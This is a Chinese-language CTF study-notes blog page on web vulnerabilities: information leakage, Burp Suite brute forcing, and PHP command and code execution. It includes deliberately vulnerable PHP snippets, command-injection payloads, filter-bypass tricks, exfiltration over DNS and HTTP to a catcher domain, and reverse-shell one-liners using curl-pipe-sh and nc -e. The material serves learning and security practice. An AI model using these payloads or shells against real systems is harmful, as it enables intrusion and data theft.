

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
  <link rel="icon" href="/img/icon.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="rainstar">
  <meta name="keywords" content="">
  
    <meta name="description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑">
<meta property="og:type" content="article">
<meta property="og:title" content="Web">
<meta property="og:url" content="https://rain00star.github.io/2024/12/03/Web/index.html">
<meta property="og:site_name" content="RainStar&#39;s Blog">
<meta property="og:description" content="[TOC] 认识漏洞 术语： poc：证明漏洞存在；exp：漏洞利用脚本 漏洞利用方式  失能：拒绝服务(DOS) 读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入） 写入：篡改数据；提权；加密硬盘 执行：执行命令；内网渗透；反弹shell  做题思路  判断利用的漏洞方式为读取、写入还是执行，不能马上确定，从低到高依次挖掘。 判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733115011030.png">
<meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733230982721.png">
<meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733881606748.png">
<meta property="og:image" content="https://rain00star.github.io/2024/12/03/Web/1733886458034.png">
<meta property="article:published_time" content="2024-12-03T11:52:54.000Z">
<meta property="article:modified_time" content="2025-05-09T02:26:17.390Z">
<meta property="article:author" content="rainstar">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://rain00star.github.io/2024/12/03/Web/1733115011030.png">
  
  
  
  <title>Web - RainStar&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"rain00star.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"noNmr9chT20dHBom1tUWnaWV-gzGzoHsz","app_key":"al8tnZ6DMkS0VQ1cKWpSbLvr","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>RainStar</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>Links</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/frontback.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Web"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-12-03 19:52" pubdate>
          December 3, 2024 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          14k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          115 mins
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Web</h1>
            
            
              <div class="markdown-body">
                
                <p>[TOC]</p>
<h2 id="认识漏洞">认识漏洞</h2>
<p>术语：</p>
<p>poc：证明漏洞存在；exp：漏洞利用脚本</p>
<h3 id="漏洞利用方式">漏洞利用方式</h3>
<ul>
<li>失能：拒绝服务(DOS)</li>
<li>读取：读取敏感文件（文件包含）；读取数据库信息（SQL注入）</li>
<li>写入：篡改数据；提权；加密硬盘</li>
<li>执行：执行命令；内网渗透；反弹shell</li>
</ul>
<h3 id="做题思路">做题思路</h3>
<ol>
<li>判断利用的漏洞方式为<strong>读取、写入还是执行</strong>，不能马上确定，从低到高依次挖掘。</li>
<li>判断漏洞大概的类型。例如：登录逻辑，尝试sql注入；下载逻辑，尝试文件读取；给源码做代码审计。</li>
<li>寻找敏感数据</li>
</ol>
<h2 id="信息泄露">信息泄露</h2>
<h3 id="信息泄露的类型">信息泄露的类型</h3>
<ul>
<li>版本软件信息泄露：</li>
</ul>
<p>git，svn，hg，bzr，cvs</p>
<ul>
<li>敏感文件信息泄露：</li>
</ul>
<p>robots.txt，www.zip，静态文件注释泄露</p>
<ul>
<li>配置错误信息泄露：</li>
</ul>
<p>DS_Store，WEB.INF，Apache/Nginx错误配置</p>
<h3 id="信息泄露漏洞利用">信息泄露漏洞利用</h3>
<h4 id="http头信息泄露">http头信息泄露</h4>
<p><code>/admin</code>和<code>/admin/</code>区别：</p>
<p>/admin：访问admin这个文件，没有的话直接返回404，不会寻找索引文件</p>
<p>/admin/：访问admin目录，会默认访问目录里面的索引文件（index.php，index.html）</p>
<p>区别访问路由和访问文件：</p>
<p>/user：访问user路由，如果含有后缀(php，html，asp，jsp)是基于文件(其实也不能明确区别，所见非真)，看后台有没有监听？？</p>
<p>状态码：</p>
<ul>
<li>200 正常</li>
<li>301 302 表示跳转</li>
<li>400出现不可识别字符</li>
<li>403表示目录存在，但访问禁止</li>
<li>404表示文件不存在</li>
<li>500服务器内部错误</li>
<li>502转发失败</li>
</ul>
<p>network里点开每个包可查看server、状态码、使用时间等信息</p>
<h4 id="报错信息泄露">报错信息泄露</h4>
<p>通过报错信息泄露服务器状态</p>
<h4 id="页面信息泄露">页面信息泄露</h4>
<p>查看页面源代码、控制台等</p>
<h4 id="robots-txt敏感文件泄露">robots.txt敏感文件泄露</h4>
<p>爬虫协议，规定哪些内容不能访问（正规的搜索引擎爬虫都会遵守），但没有任何强制约束力。</p>
<p>格式：</p>
<p>User-agent：每个搜索引擎的爬虫标识</p>
<p>Disallow：不允许访问哪些链接</p>
<p>Disallow：…</p>
<h4 id="git文件泄露">.git文件泄露</h4>
<p>版本控制系统（版本号）</p>
<p>githack脚本利用(windows)：[遇到403禁止时，可以尝试]</p>
<p>（原理）解析.git/index文件，找到所有的：（文件名，文件sha1）;接着去.git/objects/文件夹下载对应文件；zlib解压文件，按原始的结构写入源代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\GitHack.py -u <span class="hljs-string">&quot;https://xxxx/.git/&quot;</span><br></code></pre></td></tr></table></figure>
<h4 id="搜索引擎文件泄露">搜索引擎文件泄露</h4>
<p>(百度)<code>intitle:xx后台登录</code>标题</p>
<p>(fofa网络安全搜索引擎)<code>title=&quot;xx&quot;文件上传</code>标题</p>
<h3 id="总结">总结</h3>
<ol>
<li><code>robots.txt</code>泄露</li>
<li><code>.git/ </code> <code>.svn/</code>泄露（访问目录出现403访问禁止）</li>
<li>源代码泄露、http头泄露</li>
<li><strong>任意文件下载造成的信息泄露</strong></li>
<li>开源社区信息泄露，例如：泄露项目名称，整个项目代码可以在github等找到</li>
<li>使用vim异常退出，造成类似<code>index.php.swp</code>临时文件</li>
</ol>
<h2 id="Burpsuite与爆破">Burpsuite与爆破</h2>
<p>爆破-&gt;防止：验证码；</p>
<p>8位字符-&gt;76亿年，不到万不得已不用；</p>
<ol>
<li>单个位置：sniper</li>
<li>两个位置：cluster bomb，两个simplist导入两个payload</li>
<li>http认证爆破：输入的字符经过编码处理，例如admin:123456(经过base64编码)：payload导入password字典，在payload处理里加入前缀和编码，取消url编码</li>
</ol>
<h2 id="php的代码执行（RCE）">php的代码执行（RCE）</h2>
<h3 id="php基础知识">php基础知识</h3>
<h4 id="GET包转POST包">GET包转POST包</h4>
<p>bp中get转post，使用<code>change</code>快捷键</p>
<p>修改三处：GET-&gt;POST，增加Content-Type，Content-Length</p>
<h4 id="php自定义函数">php自定义函数</h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span>+<span class="hljs-variable">$b</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>    <span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="php的命令执行-执行操作系统的命令">php的命令执行(执行操作系统的命令)</h3>
<h4 id="可以执行系统命令的函数">可以执行系统命令的函数</h4>
<ul>
<li>system[相当于cmd，只能执行系统命令，不能执行phpinfo();]</li>
<li>passthru</li>
<li>exec</li>
<li>shell_exec</li>
<li>popen</li>
<li>pcntl_exec</li>
<li>执行运算符`，底层执行（shell_exec）</li>
</ul>
<p>windows下可以执行的命令：calc,bat,vbs等</p>
<p>linux下可以执行的命令：cat,cp,nc,whoami等</p>
<h4 id="几种类型">几种类型</h4>
<p>例如：ping -c 1 <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></p>
<ul>
<li>命令可控 例如ping</li>
<li>参数可控 -c可控</li>
<li>参数值可控 1和www.baidu.com可控</li>
<li>整体可控，但要突破过滤</li>
</ul>
<h4 id="参数值可控">参数值可控</h4>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls&quot;</span>.<span class="hljs-variable">$dir</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>此时默认回显当前工作目录中的所有文件和子目录，flag.php、index.php</p>
<p>解题：多命令的执行：<code>dir=;cat flag.php</code>或者<code>dir=&amp;&amp;cat flag.php</code></p>
<p>由于浏览器不认识<code>&lt;?php</code>标记，需要去源代码界面查看flag.php文件，可以将<code>cat</code>修改为<code>tac</code>从最后一行开始读。</p>
<ul>
<li>&amp;&amp;（需要进行URL编码） 前后两个命令并列执行</li>
<li>|| （需要进行URL编码）前后两个命令有一个执行成功即可，存在短路</li>
<li>； 独立的两条命令执行</li>
</ul>
<h4 id="命令可控">命令可控</h4>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;dir&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>命令解释：<code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>命令重定向操作，同时丢弃标准输出和标准错误，不会有任何回显。</p>
<ul>
<li><strong>&gt;</strong>：这是输出重定向操作符。它将标准输出（stdout）重定向到指定的位置。</li>
<li><strong>/dev/null</strong>：这是一个特殊的文件，通常被称为“黑洞”。任何写入这个文件的数据都会被丢弃。将输出重定向到 <code>/dev/null</code> 意味着放弃该输出。</li>
<li>1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 “1&gt;/dev/null”</li>
<li><strong>2&gt;&amp;1</strong>：这是将标准错误（stderr，文件描述符2）重定向到标准输出（stdout，文件描述符1）的操作。<strong><code>2</code> 表示标准错误，<code>1</code> 表示标准输出</strong>。<code>&gt;&amp;</code> 表示将一个文件描述符的输出重定向到另一个文件描述符。由于标准输出已经被重定向到 <code>/dev/null</code>，因此标准错误也会被重定向到同样的地方，最终也被丢弃。</li>
</ul>
<p>解题：使用<code>;</code>  <code>||</code>  <code>&amp;&amp;</code> 进行命令分隔即可。</p>
<h4 id="整体可控">整体可控</h4>
<h5 id="黑名单过滤">黑名单过滤</h5>
<ul>
<li>替换过滤：把敏感关键字替换为<strong>空</strong></li>
</ul>
<p>策略：双写绕过，例如<code>ccatat</code>，替换后正好变成<code>cat</code>。</p>
<ul>
<li>过滤特定字符串：过滤flag等关键字</li>
</ul>
<p>策略：使用通配符（<code>*</code> <code>?</code>）绕过，其中<code>*</code>表示任意长度字符，<code>？</code>表示一个字符。</p>
<p>常见命令，批量移动文件，使用命令：<code>mv *.txt ./tmp</code></p>
<h6 id="通配符">通配符</h6>
<p>代码审计：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|\&amp;|\;/i&quot;</span>,<span class="hljs-variable">$cmd</span>))  <span class="hljs-comment">//！preg_match()表示没有匹配到</span><br>    &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<ul>
<li>preg_match(rules,string) : 前面为匹配规则，后面为要匹配的字符串</li>
<li>规则详谈：主要是3部分<code>/flag</code>  <code>\&amp;</code>  <code>\;</code>  ，中间使用<code>|</code>表示或的关系，<code>/i</code>是一种模式，表示不区分大小写；</li>
<li><code>/flag</code>  ：表示<strong>部分匹配</strong>flag字符串（包括myflag,flagggg等）  ；完全匹配的格式<code>/^flag$</code>(不包括myflag…)</li>
<li><code>\&amp;</code> ：表示部分匹配&amp;符号，由于&amp;是一个特殊字符，所以需要加\进行转义</li>
<li><code>\;</code>同上</li>
</ul>
<p>解题：使用通配符绕过即可。</p>
<h6 id="更多命令，-执行和base64编码">更多命令，``执行和base64编码</h6>
<p>过滤<code>cat</code>  <code>more</code>等文件读取命令：</p>
<p>解法一：（更多命令）tac nl od等</p>
<ul>
<li>
<p>cat example.txt</p>
</li>
<li>
<p>tac example.txt</p>
</li>
<li>
<p>more example.txt：分页显示文件内容，space翻页，enter向下滚动一行，b向上翻页，q退出</p>
</li>
<li>
<p>nl example.txt ：显示文件内容，同时在每一行前加上行号</p>
</li>
<li>
<p>od -c example.txt ：以字符形式显示</p>
<p>od -x example.txt ：以十六进制形式显示</p>
<p>od -d example.txt ：以十进制形式显示</p>
</li>
</ul>
<p>解法二：利用``可执行命令进行命令组合执行</p>
<p><img src="/2024/12/03/Web/1733115011030.png" srcset="/img/loading.gif" lazyload alt="1733115011030"></p>
<p>可利用编码解码进行绕过echo ‘base64_en(cat flag.php)’|base64 -d（外加``）</p>
<h6 id="变量拼接过滤关键字">变量拼接过滤关键字</h6>
<p>cat flag.php 等价：</p>
<p><code>cmd = a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;</code></p>
<p>这里花括号用来明确变量边界</p>
<p>eval()里好像不能进行拼接？？？</p>
<h5 id="符号过滤">符号过滤</h5>
<h6 id="空格过滤">空格过滤</h6>
<ol>
<li><strong>读文件</strong>，用&lt;&gt;代替空格</li>
<li>使用<code>$&#123;IFS&#125;</code>或者<code>$IFS$9</code>来代替空格，bash下甚至可用{cmd,args}来代替空格</li>
<li>控制字符代替空格（<code>%09</code> <code>%0b</code> <code>%0c</code>） -&gt; 过滤 \x09</li>
<li>字符串截取空格：</li>
</ol>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#功能介绍</span><br><span class="hljs-attribute">cmd</span>=aabbcc<br><span class="hljs-variable">$&#123;cmd&#125;</span><br><span class="hljs-comment">#输出aabbcc</span><br><br><span class="hljs-variable">$&#123;cmd:2&#125;</span><br><span class="hljs-comment">#输出bbcc</span><br><br><span class="hljs-variable">$&#123;cmd:4:1&#125;</span><br><span class="hljs-comment">#输出c</span><br></code></pre></td></tr></table></figure>
<p>从环境变量<code>cmd=env</code>截取空格，环境变量开头为<code>环境变量名=</code>，利用<code>$&#123;环境变量名&#125;</code>使用</p>
<h4 id="无回显命令执行shell-exec">无回显命令执行shell_exec()</h4>
<h5 id="写通道">写通道</h5>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">url/?<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">ls</span> &gt; 1.txt</span><br>访问：<br>url/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
<h5 id="DNS通道">DNS通道</h5>
<p>一些网站可获取dnslog信息</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">url/?cmd=ping -c <span class="hljs-number">1</span> `whoami`.xx.xx(获取的二级域名)<br></code></pre></td></tr></table></figure>
<p>可能出现行数有限的情况；可以分段获取信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">url/?<span class="hljs-attribute">cmd</span>=a=`sed -n <span class="hljs-string">&quot;3,4p&quot;</span> 1.txt`;curl <span class="hljs-variable">$&#123;a:0:10 |base64&#125;</span>.xx.xx;<br></code></pre></td></tr></table></figure>
<ul>
<li>首先是<code>sed -n &quot;3,4p&quot; 1.txt</code> :</li>
</ul>
<p>sed：是一个流编辑器，用于对文本进行处理和转换。</p>
<p>-n：告诉 sed 不要自动打印每一行的输出。默认情况下，sed 会打印所有处理过的行，使用 -n 选项后，只有明确指定的行才会被打印。</p>
<p>3,4：指定要处理的行范围，从第 3 行到第 4 行。<br>
p：表示打印匹配到的行。</p>
<p>1.txt：是要处理的输入文件名。<br>
结合起来，这条命令的作用是从文件 1.txt 中提取并打印出第 3 行和第 4 行的内容。</p>
<ul>
<li><code>curl</code>命令，模拟向服务器发送请求</li>
<li>可进行base64编码</li>
</ul>
<h5 id="http信道">http信道</h5>
<p>向requestrepo.com网站发送request请求，在参数里解析命令</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">curl <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/xx.requestrepo.com/</span><span class="hljs-string">?1</span>=<span class="hljs-string">``</span>;<br></code></pre></td></tr></table></figure>
<p>利用GET解析命令。</p>
<p>现在访问好像获取不了子域名，等待尝试。</p>
<h5 id="反弹shell信道">反弹shell信道</h5>
<p>（需要有公网IP）</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://xn--your-shell-db7py7v.com">借助your-shell.com</a>:</li>
</ol>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">curl https://your-<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">com</span>/yourip:port_num | <span class="hljs-keyword">sh</span><br>监听端监听对应端口:<br>nc -lvvnp port_num<br></code></pre></td></tr></table></figure>
<ol start="2">
<li>直接输入命令：</li>
</ol>
<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm">攻击端：<br><span class="hljs-title">nc</span> <span class="hljs-type">IP</span> port_num -e /bin/sh<br>监听端：<br><span class="hljs-title">nc</span> -lvvnp port_num<br></code></pre></td></tr></table></figure>
<h5 id="延时信道">延时信道</h5>
<p>可用于验证命令是否成功执行</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">？<span class="hljs-keyword">cmd</span><span class="language-bash">=<span class="hljs-built_in">sleep</span> 3</span><br></code></pre></td></tr></table></figure>
<h4 id="绕过总结">绕过总结</h4>
<ol>
<li>双写绕过</li>
<li>通配符绕过？ *</li>
<li>命令替换</li>
<li>整体编码</li>
<li>拼接关键字</li>
<li>符号过滤：空格（1. 文件：&lt;&gt;  2. ${IFS} 3. 控制字符：%09 4. 环境变量截取 ）</li>
</ol>
<h3 id="php的代码执行（执行php代码）">php的代码执行（执行php代码）</h3>
<h4 id="可以执行php代码的函数">可以执行php代码的函数</h4>
<p>eval() : 把一串字符当作php代码执行，可以转为命令执行<code>code=system('')</code></p>
<p>call_user_func()：把第一个参数作为回调函数调用，代码举例如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increment</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$var</span>++;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-number">0</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;increment&#x27;</span>, <span class="hljs-keyword">array</span>(&amp;<span class="hljs-variable">$a</span>)); <span class="hljs-comment">// You can use this instead before PHP 5.3</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-meta">?&gt;</span> <br>    <br><span class="hljs-comment">//输出0</span><br><span class="hljs-comment">//输出1</span><br></code></pre></td></tr></table></figure>
<p>call_user_func_array()：调用回调函数，并把一个数组参数作为回调函数的参数，代码实例如下：(简单理解为传递多个参数)</p>
